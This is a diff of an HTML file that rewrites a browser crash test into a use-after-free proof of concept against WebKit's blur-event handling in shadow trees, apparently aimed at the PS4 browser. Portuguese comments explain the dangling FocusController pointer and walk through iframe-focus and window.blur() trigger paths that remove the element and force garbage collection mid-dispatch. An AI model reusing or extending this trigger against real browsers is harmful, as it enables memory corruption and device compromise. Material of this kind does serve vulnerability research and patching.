@@ -1,63 +1,68 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>blur-window-with-focus-in-shadow-tree - PS4 Phase A</title>
-</head>
 <body>
-<p>This test passes if it does not crash.</p>
+<p>UAF PoC — Element::dispatchBlurEvent / shadow tree</p>
 <div id="host"></div>
-<div id="result"></div>
-<button id="run">Run test</button>
-<script src="gc.js"></script>
+<div id="result">Aguardando...</div>
+<script src="resources/gc.js"></script>
 <script>
-var shadowRoot;
-var victim;
-var blurTriggered = false;
-var focusTriggered = false;
+'use strict';
 
-function runTest() {
-    if (!host.attachShadow) {
-        result.textContent = 'Shadow DOM not supported';
-        return;
-    }
+let shadowRoot = host.attachShadow({ mode: 'open' });
+let victim = document.createElement('div');
+victim.tabIndex = 0;
+victim.textContent = 'Focusable';
+shadowRoot.appendChild(victim);
+victim.focus();  // foco ANTES de qualquer await
 
-    shadowRoot = host.attachShadow({ mode: 'open' });
+async function runTest() {
 
-    victim = document.createElement('div');
-    victim.tabIndex = 0;
-    victim.textContent = 'Focusable';
-
-    shadowRoot.appendChild(victim);
-    victim.focus();
-
-    document.addEventListener('blur', function() {
-        blurTriggered = true;
-
-        if (victim) {
-            victim.parentNode.removeChild(victim);
-            victim = null;
-            gc();
-        }
+    // Captura o blur no document (fase capturing) ANTES do elemento receber o evento.
+    // É aqui que o UAF ocorre: remove + GC durante o dispatch de dispatchBlurEvent()
+    // enquanto o FocusController ainda segura um raw pointer sem RefPtr.
+    document.addEventListener('blur', () => {
+        if (!victim) return;  // guard contra double-fire
+        victim.remove();
+        victim = null;
+        gc();
     }, true);
 
-    document.addEventListener('focus', function() {
-        focusTriggered = true;
-    }, true);
+    // Promise que resolve quando window recebe blur
+    // (window.blur é disparado por dispatchWindowEvent() logo APÓS dispatchBlurEvent())
+    const blurPromise = new Promise(resolve => {
+        window.addEventListener('blur', () => {
+            requestAnimationFrame(() => setTimeout(resolve, 0));
+        }, { once: true });
+    });
 
-    setTimeout(function() {
-        window.blur();
+    // ── TRIGGER ──────────────────────────────────────────────────────────────
+    // Objetivo: chamar dispatchEventsOnWindowAndFocusedElement(mainFrameDoc, false)
+    //
+    // Estratégia primária: mover o foco para um iframe
+    // → FocusController::setFocusedFrame(iframeFrame)
+    // → dispatchEventsOnWindowAndFocusedElement(mainDoc, false)  ← path bugado
+    const iframe = document.createElement('iframe');
+    iframe.src = 'about:blank';
+    iframe.style.cssText = 'position:fixed;width:1px;height:1px;top:-100px;left:-100px;';
+    document.body.appendChild(iframe);
 
-        setTimeout(function() {
-            if (blurTriggered)
-                result.textContent = 'PASS: window blur triggered';
-            else
-                result.textContent = 'Window blur was not triggered';
-        }, 1000);
-    }, 500);
+    try {
+        iframe.contentWindow.focus();
+    } catch (e) {}
+
+    // Estratégia fallback: window.blur()
+    // → DOMWindow::blur() → chrome().unfocusWindow() → WebPage::setWindowIsKey(false)
+    // Funciona se a implementação do PS4 suportar unfocusWindow
+    setTimeout(() => {
+        try { window.blur(); } catch (e) {}
+    }, 300);
+    // ─────────────────────────────────────────────────────────────────────────
+
+    await blurPromise;
+    result.textContent = 'PASS (sem crash)';
 }
 
-document.getElementById('run').onclick = runTest;
+runTest();
 </script>
 </body>
 </html>
